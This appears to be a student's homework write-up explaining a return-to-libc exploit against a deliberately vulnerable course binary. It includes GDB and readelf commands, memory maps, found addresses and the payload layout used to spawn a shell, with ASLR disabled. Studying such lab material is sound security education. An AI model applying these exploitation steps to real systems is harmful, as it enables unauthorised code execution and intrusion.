## Vuln2

### Strategy

This simple program will take input from the `argv`, copy this input into a buffer, and print the buffer to stdout.

This program is vulnerable to a buffer overflow, however it does not have an executable stack. 

We will have to use return-to-libc with a payload of gagdets to get our shell.

To overflow to the return address, we need to calculate the amount of bytes it takes to get there. 
```C
char buf[256]; // 256 bytes
```

Thats 256 bytes, plus 4 for the frame pointer, plus another 4(zero padding in GDB. Not sure exactly).

The return address is offset by 264 bytes, the next 4 bytes **is** the return address.

To get the return address, we can use GDB and anaylze what address on the stack is `char buf[256]`.

At the time of this writeup, I got the address `0xbffff1dc` to be the address where the program stores the return address

>Note: Be sure to disable ASLR!

To get this value, I opened up the program in `gdb(1)` and ran this command...

	run `python -c 'print "CCCC" + "A"*260 + "BBBB"'`

and 
	
	x/100x $esp

To get the idea of memory on the stack. This can help us craft a return address, to hijack the program's executation into our payload.

`hack.py` is our python script that will launch the program with the malicious payload. 

Now to create the payload. 

We no longer have the privilage to run arbitrary code on the stack, thanks to the W^X protection. However, we can still manipulate the control flow of the program with a series of return addresses

Lets analyze the binary further.

	ldd vuln2
 
```
	linux-gate.so.1 (0xb7fd5000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7dd3000)
	/lib/ld-linux.so.2 (0xb7fd6000)
```
Looks like we have libc, awesome. Lets find the addresses for `system(3)`, `/bin/sh`, and `exit(3)`.

>Note: I am on a later version of libc, please map accordingly to your version. 

To find `/bin/sh`, we can use `gdb(1)`

	gdb ./vuln2
	break main
	info proc mappings

```
process 12819
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
          0x400000   0x401000     0x1000        0x0 /home/kali/Documents/CSE363_hw4/vuln2/vuln2
          0x401000   0x402000     0x1000     0x1000 /home/kali/Documents/CSE363_hw4/vuln2/vuln2
          0x402000   0x403000     0x1000     0x2000 /home/kali/Documents/CSE363_hw4/vuln2/vuln2
          0x403000   0x404000     0x1000     0x2000 /home/kali/Documents/CSE363_hw4/vuln2/vuln2
          0x404000   0x405000     0x1000     0x3000 /home/kali/Documents/CSE363_hw4/vuln2/vuln2
        0xb7dd8000 0xb7df5000    0x1d000        0x0 /usr/lib/i386-linux-gnu/libc-2.30.so
        0xb7df5000 0xb7f47000   0x152000    0x1d000 /usr/lib/i386-linux-gnu/libc-2.30.so
        0xb7f47000 0xb7fb6000    0x6f000   0x16f000 /usr/lib/i386-linux-gnu/libc-2.30.so
        0xb7fb6000 0xb7fb8000     0x2000   0x1dd000 /usr/lib/i386-linux-gnu/libc-2.30.so
        0xb7fb8000 0xb7fba000     0x2000   0x1df000 /usr/lib/i386-linux-gnu/libc-2.30.so
        0xb7fba000 0xb7fbc000     0x2000        0x0 
        0xb7fd0000 0xb7fd2000     0x2000        0x0 
        0xb7fd2000 0xb7fd5000     0x3000        0x0 [vvar]
        0xb7fd5000 0xb7fd6000     0x1000        0x0 [vdso]
        0xb7fd6000 0xb7fd7000     0x1000        0x0 /usr/lib/i386-linux-gnu/ld-2.30.so
        0xb7fd7000 0xb7ff3000    0x1c000     0x1000 /usr/lib/i386-linux-gnu/ld-2.30.so
        0xb7ff3000 0xb7ffe000     0xb000    0x1d000 /usr/lib/i386-linux-gnu/ld-2.30.so
        0xb7ffe000 0xb7fff000     0x1000    0x27000 /usr/lib/i386-linux-gnu/ld-2.30.so
        0xb7fff000 0xb8000000     0x1000    0x28000 /usr/lib/i386-linux-gnu/ld-2.30.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

Looks like libc starts at 0xb7dd8000, lets search there. Lets find the address to the string "/bin/sh".

	find 0xb7dd8000, 0xb7fba000, "/bin/sh"
	0xb7f60406
	1 pattern found.
	x/s 0xb7f60406
	0xb7f60406:     "/bin/sh"

Perfect, we have the argument for system. Now to the library functions.

We can use `readelf(1)` to find the offsets to those funcitons. 


	readelf -s /usr/lib/i386-linux-gnu/libc-2.30.so | grep system

```
...
  1533: 00044630    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
...
```

	readelf -s /usr/lib/i386-linux-gnu/libc-2.30.so | grep exit

```
...
   150: 000373a0    33 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.0
...
```

We have the offsets 0x00044630 for `system(3)` and 0x000373a0 for `exit(3)`. We will take note of these values in our hack script.

The reason we want `exit(3)` is so the program can exit gracefully after `system(3)` returns.

Finally, lets make the payload. It should follow this structure.

PADDING + SYSTEM + EXIT + BIN_SH

### Exploitation

To pop a shell, run this command.

	./hack.py

You should have a shell!

### Resources
Thank you John Hammond and Professor Michalis Polychronakis

CSE363 Lecture 13(Code Reuse) (https://piazza.com/class_profile/get_resource/k5psogz57l86i5/k8evpwhcfmd5s9)

https://www.youtube.com/watch?v=evug4AhrO7o


